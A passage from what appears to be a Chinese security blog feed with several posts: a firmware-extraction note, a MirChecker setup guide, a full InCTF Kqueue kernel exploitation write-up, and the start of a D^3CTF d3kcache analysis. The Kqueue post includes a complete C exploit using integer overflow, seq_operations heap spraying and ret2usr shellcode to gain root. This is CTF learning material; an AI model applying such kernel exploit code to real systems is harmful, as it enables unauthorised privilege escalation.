<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test/app_pri/hik_ar9331_2.bin</span><br><span class="line">test/app_pri/heop/package/smart/dsp/model/ped_ied_detect_888/coef.bin</span><br><span class="line">test/app_pri/heop/package/smart/dsp/model/ped_ied_cls3d_888/coef.bin</span><br><span class="line">test/app_pri/heop/package/smart/dsp/libHMS_lib_V4.5_banding.a</span><br><span class="line">test/app_pri/heop/package/smart/fsa/lib/libobject_leave_event.so.1.1.0</span><br><span class="line">test/app_pri/heop/package/smart/fsa/smart</span><br><span class="line">test/app_pri/app.tar.gz</span><br><span class="line">test/app_pri/h8_modules.tgz</span><br><span class="line">test/app_pri/webLib/doc/ui/images/pwd-reset.png</span><br><span class="line">test/app_pri/webLib/doc/page/panorama/image/refresh_click.png</span><br><span class="line">test/app_pri/webLib/doc/script/lib/jsPlugin/playctrl/Decoder.wasm</span><br><span class="line">test/app_pri/webLib/doc/script/lib/excanvas.js</span><br><span class="line">test/app_pri/webLib/doc/script/lib/angularjs/angularjs/angular.min.js</span><br><span class="line">test/app_pri/webLib/doc/script/playback/search.js</span><br><span class="line">test/app_pri/webLib/doc/script/config/faceAttendance/faceAttendanceAlgorithm.js</span><br><span class="line">test/app_pri/webLib/doc/script/config/system/newSettingVCAResource.js</span><br></pre></td></tr></table></figure>
<p>然后发现还存在其他的报错类型，其实大概率也是因为仅靠 crc 来爆破并不是唯一解的原因，这种情况大概有68-16&#x3D;52个，报错信息如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR writing b&#x27;test/app_pri/curl&#x27;, Compressed data violation -6</span><br></pre></td></tr></table></figure>
<p>不过其实大差不差了，因为我们不需要模拟 : )，可以进行基本的二进制程序分析了。</p>
<p>接下来是另外一个问题：invalid inode size，也是 bit flip 的问题，直接修改掉即可<br>这里我们通过 listfiles 功能可以得到所有的文件数量为： 2135个（多了114个文件）</p>
<p>更新之前的结果，共有 72 个文件失败，19 个直接由于crc爆破失败导致。<br>似乎还有一些文件没有提出来，这个似乎是因为 vid_table 的选取问题，因为这一部分的修复为直接硬编码指定了对应 rootfs 的，其他的直接忽略掉了。</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
  </entry>
  <entry>
    <title>MirChecker工具使用</title>
    <url>/posts/adfb406b.html</url>
    <content><![CDATA[<p>该工具是一个用于 rust 内存错误检查的工具，主要是静态分析的方法。<br>跟着 <a href="https://github.com/lizhuohua/rust-mir-checker/blob/master/.github/workflows/build.yml">workflow</a> 来就行 : -)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install build-essential</span><br><span class="line">apt-get install m4</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">fix <span class="keyword">for</span> unable to find library -lLLVM-11-rust-1.51.0-nightly</span></span><br><span class="line">rustup toolchain uninstall nightly-2020-12-29-x86_64-unknown-linux-gnu</span><br><span class="line">rustup toolchain install nightly-2020-12-29 --force</span><br><span class="line">rustup component add rustc-dev llvm-tools-preview</span><br><span class="line">cargo clean</span><br><span class="line">cargo build --verbose</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">need to specify lib<span class="string">&#x27;s path</span></span></span><br><span class="line">export LD_LIBRARY_PATH=$HOME/.rustup/toolchains/nightly-2020-12-29-x86_64-unknown-linux-gnu/lib:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>
<p>编译目标项目需要保证cargo metadata命令有正确输出。由于版本过老可能需要修改cargo.toml来重置依赖。<br>库crate需要自己定义main.rs调用入口</p>
<blockquote>
<p>只是粗略的看了和试了下，评价是不如rudra👀</p>
</blockquote>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/lizhuohua/rust-mir-checker">MirChecker</a></li>
</ul>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>InCTF Kqueue学习</title>
    <url>/posts/b0f18d55.html</url>
    <content><![CDATA[<p>堆溢出例题，参考a3大佬的博客来学习 : -)</p>
<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>查看启动脚本，开启了KASLR,关闭了KPTI,可以利用ret2usr进行利用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel &quot;bzImage&quot; \</span><br><span class="line">    -append &quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd &quot;./rootfs.cpio&quot; \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br></pre></td></tr></table></figure>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>提供了<code>kqueue.c</code>源码，定义了<code>kqueue</code>设备，ops只定义了<code>ioctl</code>操作。该操作为一个堆菜单，包括增删改查等操作。</p>
<p>用户传入的结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;	<span class="comment">// 一个kqueue中的entries数目</span></span><br><span class="line">    <span class="type">uint16_t</span> data_size;		<span class="comment">// 一个kqueue元素的大小</span></span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;		<span class="comment">// 在kqueue中的index</span></span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;		<span class="comment">// queue的index</span></span><br><span class="line">    <span class="type">char</span>* data;				<span class="comment">// 传入数据指针</span></span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br></pre></td></tr></table></figure>

<p>在模块中进行创建和维护的结构或者说内存布局应该如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-------------------------	&lt;-	0</span><br><span class="line">|		main_queue		| </span><br><span class="line">-------------------------	&lt;-	data_size</span><br><span class="line">|	queue_entry_list[0]	|</span><br><span class="line">-------------------------	&lt;- 	data_size*2</span><br><span class="line">|	queue_entry_list[1]	|</span><br><span class="line">-------------------------	&lt;- 	data_size*3</span><br><span class="line">|	queue_entry_list[2]	|</span><br><span class="line">-------------------------	&lt;- 	data_size*4</span><br><span class="line">|	...					|</span><br><span class="line">-------------------------</span><br><span class="line">|	queue_entry_list[n]	|</span><br><span class="line">-------------------------	&lt;- 	data_size*(max_entries+1)</span><br></pre></td></tr></table></figure>

<p>main_queue为queue结构体，其内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint64_t</span> queue_size; <span class="comment">/* This needs to handle larger numbers */</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br></pre></td></tr></table></figure>

<p>queue_entry_list中每个条目为queue_entry结构体，其内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span>&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> idx;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    queue_entry *next;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>然后需要注意的一点是该题目定义的err函数内容如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">err</span><span class="params">(<span class="type">char</span>* msg)</span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说输入不合法数据并不会错误退出。</p>
<h3 id="create操作"><a href="#create操作" class="headerlink" title="create操作"></a>create操作</h3><p>直接分配<code>queue_size = (max_entries+1) * data_size + sizeof(queue)</code>大小的堆内存空间；然后为main_queue以及每个queue_entry赋值。</p>
<p>虽然有整数溢出判断逻辑，但是并不会exit。</p>
<h3 id="delete操作"><a href="#delete操作" class="headerlink" title="delete操作"></a>delete操作</h3><p>free掉指定idx的queue_entry。</p>
<h3 id="edit操作"><a href="#edit操作" class="headerlink" title="edit操作"></a>edit操作</h3><p>修改指定index的queue_entry数据内容</p>
<h3 id="save操作"><a href="#save操作" class="headerlink" title="save操作"></a>save操作</h3><p>分配queue_size大小的堆并按照 <strong>request.data_size 来进行 memcpy</strong>。因此这里存在堆溢出。</p>
<h2 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h2><p>存在create的整数溢出以及save的堆溢出。</p>
<p>整数溢出可以直接发送<code>request.max_entries = 0xffffffff</code>，从而<code>__builtin_umull_overflow</code>函数计算space为0,并且可以绕过整数溢出检测。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(__builtin_umulll_overflow(<span class="keyword">sizeof</span>(queue_entry),(request.max_entries+<span class="number">1</span>),&amp;space) == <span class="literal">true</span>)</span><br></pre></td></tr></table></figure>

<p>因此可以发送0xffffffff的max_entries输入，create函数会申请大小为0x18的chunk,该大小会分配到kmalloc-32中，如果要实现利用要选取从该slab中分配的结构体。为<strong>seq_operations</strong>，当我们打开一个 stat 文件时（<code>/proc/self/stat</code>）便会在内核中分配一个seq_operations结构体，该结构体定义于 <code>/include/linux/seq_file.h</code>文件中，只定义了4个函数指针：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">	<span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">	<span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当我们read一个stat文件时，内核会调用其proc_ops的<code>proc_read_iter</code>指针，默认为<code>seq_read_iter()</code>函数，定义为<code>fs/seq_file.c</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>其调用了seq_operations-&gt;start函数。因此可以控制start函数来提权。</p>
<p>由于开启了RANDOM_FREELIST保护，需要通过堆喷的方式让queue结构体堆附近布满seq_operation结构体，从而让其能够达到溢出的目的。</p>
<p>至于如何泄漏内核基址，通过编写shellcode在内核栈上找到数据（因为没有开启smep,smap）来执行<code>commit_creds(prepare_kernel_cred(NULL))</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;mov r12, [rsp + 0x8];&quot;</span><br><span class="line">&quot;sub r12, 0x201179;&quot;</span><br><span class="line">&quot;mov r13, r12;&quot;</span><br><span class="line">&quot;add r12, 0x8c580;&quot;  // prepare_kernel_cred</span><br><span class="line">&quot;add r13, 0x8c140;&quot;  // commit_creds</span><br><span class="line">&quot;xor rdi, rdi;&quot;</span><br><span class="line">&quot;call r12;&quot;</span><br><span class="line">&quot;mov rdi, rax;&quot;</span><br><span class="line">&quot;call r13;&quot;</span><br><span class="line">&quot;swapgs;&quot;</span><br><span class="line">&quot;mov r14, user_ss;&quot;</span><br><span class="line">&quot;push r14;&quot;</span><br><span class="line">&quot;mov r14, user_sp;&quot;</span><br><span class="line">&quot;push r14;&quot;</span><br><span class="line">&quot;mov r14, user_rflags;&quot;</span><br><span class="line">&quot;push r14;&quot;</span><br><span class="line">&quot;mov r14, user_cs;&quot;</span><br><span class="line">&quot;push r14;&quot;</span><br><span class="line">&quot;mov r14, root_rip;&quot;</span><br><span class="line">&quot;push r14;&quot;</span><br><span class="line">&quot;iretq;&quot;</span><br></pre></td></tr></table></figure>

<p>编写exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernelpwn.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">                               </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_STAT_FILE_NUM   0x200</span></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> root_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;	<span class="comment">// 一个kqueue中的entries数目</span></span><br><span class="line">    <span class="type">uint16_t</span> data_size;		<span class="comment">// 一个kqueue元素的大小</span></span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;		<span class="comment">// 在kqueue中的index</span></span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;		<span class="comment">// queue的index</span></span><br><span class="line">    <span class="type">char</span>* data;				<span class="comment">// 传入数据指针</span></span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_kqueue</span><span class="params">(<span class="type">uint32_t</span> max_entries, <span class="type">uint16_t</span> data_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    request.max_entries = max_entries;</span><br><span class="line">    request.data_size = data_size;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, CREATE_KQUEUE, &amp;request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_kqueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    request.queue_idx = queue_idx;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, DELETE_KQUEUE, &amp;request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_kqueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx, <span class="type">uint16_t</span> entry_idx, <span class="type">char</span> * data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    request.queue_idx = queue_idx;</span><br><span class="line">    request.entry_idx = entry_idx;</span><br><span class="line">    request.data = data;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, EDIT_KQUEUE, &amp;request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_kqueue</span><span class="params">(<span class="type">uint16_t</span> queue_idx, <span class="type">uint16_t</span> data_size, <span class="type">uint16_t</span> max_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">request_t</span> request;</span><br><span class="line">    request.max_entries = max_entries;</span><br><span class="line">    request.queue_idx = queue_idx;</span><br><span class="line">    request.data_size = data_size;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, SAVE, &amp;request);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usr_shellcode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rax, [rsp+8];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;sub rax, 0x201179;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;sub rbp, 0x8;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;xor rdi, rdi;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r12, [rsp];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;add r12, 0x8c580;&quot;</span>  <span class="comment">// prepare_kernel_cred</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;call r12;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov rdi, rax;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r12, [rsp];&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;add r12, 0x8c140;&quot;</span>  <span class="comment">// commit_creds</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;call r12;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;swapgs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r14, user_ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push r14;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r14, user_sp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push r14;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r14, user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push r14;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r14, user_cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push r14;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov r14, root_shell;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;push r14;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;iretq;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;.att_syntax;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd_list[MAX_STAT_FILE_NUM];</span><br><span class="line">    <span class="type">size_t</span> * data;</span><br><span class="line">    <span class="type">char</span> * tmp_data;</span><br><span class="line">    <span class="comment">// basic works</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    root_shell = (<span class="type">size_t</span>)(&amp;get_root_shell);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// open target device</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;open target device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x100</span>/<span class="number">8</span>; i++)&#123;</span><br><span class="line">        data[i] = (<span class="type">size_t</span>)usr_shellcode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger interger overflow</span></span><br><span class="line">    log_info(<span class="string">&quot;Step1: send max_entrie 0xffffffff to trigger interger overflow&quot;</span>);</span><br><span class="line">    create_kqueue(<span class="number">0xffffffff</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// heap spray seq_operations</span></span><br><span class="line">    log_info(<span class="string">&quot;Step2: heap spraying...&quot;</span>);</span><br><span class="line">    edit_kqueue(<span class="number">0</span>, <span class="number">0</span>, (<span class="type">char</span> *)data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;MAX_STAT_FILE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        fd_list[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// heap overflow to overwrite seq_operations-&gt;start func pointer</span></span><br><span class="line">    log_info(<span class="string">&quot;Step3: heap overflow to overwrite seq_operation.start&quot;</span>);</span><br><span class="line"></span><br><span class="line">    save_kqueue(<span class="number">0</span>, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    tmp_data = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;MAX_STAT_FILE_NUM; i++)&#123;</span><br><span class="line">        read(fd_list[i], tmp_data, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终可以成功执行到system(“&#x2F;bin&#x2F;sh”)函数，但是会出现栈不平衡的问题，暂时还没找到解决方法。(后续，堆喷的数量太多了，设置成 0x200 即可)</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AInCTF2021-Kqueue">例题：InCTF2021 - Kqueue</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>D^3CTF 2023 - d3kcache学习</title>
    <url>/posts/1741e6b2.html</url>
    <content><![CDATA[<blockquote>
<p>学习 Page-Level 堆风水，学习a3大佬的文章 : -)</p>
</blockquote>
<h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><p>查看 run.sh 脚本内容，发现开启 smep, smap, kpti, kaslr 。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -cpu kvm64,+smep,+smap \</span><br><span class="line">    -smp cores=2,threads=2 \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -hda ./rootfs.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -snapshot \</span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/sda rw rdinit=/sbin/init kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">    -no-reboot \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>

<p>查看 config 文件，常见的保护机制如下，基本上能开的都开了QAQ：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CONFIG_MEMCG_KMEM=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="line">CONFIG_CFI_CLANG=y				# clang实现的控制流执行保护，应该是对指针跳转做了加强</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br></pre></td></tr></table></figure>

<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p><code>/root/d3kcache.ko</code>定义了字符设备 <code>d3kcache</code>，并注册了 <code>ioctl</code>, <code>read</code>, <code>write</code>, <code>open</code>, <code>release</code>操作。</p>
<p>在 init_module 函数使用 <code>kmem_cache_create_usercopy</code> （kmem_cache_create的内部实现）创建了一个 kmem_cache ，传入的flag参数为：<code>SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT</code>；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_96B);</span><br><span class="line">  major_num = _register_chrdev(<span class="number">0</span>, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_fo);</span><br><span class="line">  <span class="keyword">if</span> ( major_num &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    module_class = _class_create(&amp;_this_module, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_module_init___key);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)module_class &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_A0D);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">      module_device = device_create(module_class, <span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(major_num &lt;&lt; <span class="number">20</span>), <span class="number">0</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_A66);</span><br><span class="line">        spin = <span class="number">0</span>;</span><br><span class="line">        kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">2048</span>, <span class="number">0</span>, <span class="number">0x4042000</span>, <span class="number">0</span>, <span class="number">2048</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;kcache_list, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        _unregister_chrdev((<span class="type">unsigned</span> <span class="type">int</span>)major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">        printk(&amp;unk_A3B);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)module_device;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      _unregister_chrdev((<span class="type">unsigned</span> <span class="type">int</span>)major_num, <span class="number">0</span>, <span class="number">256</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      printk(&amp;unk_9DE);</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)module_class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_9AD);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)major_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>d3kcache_read</code>和<code>d3kcache_write</code>函数没有实现功能。</p>
<p><code>d3kcache_ioctl</code>功能为堆菜单，包括增删改查功能，其中在”改”功能中存在 off-by-null 漏洞。</p>
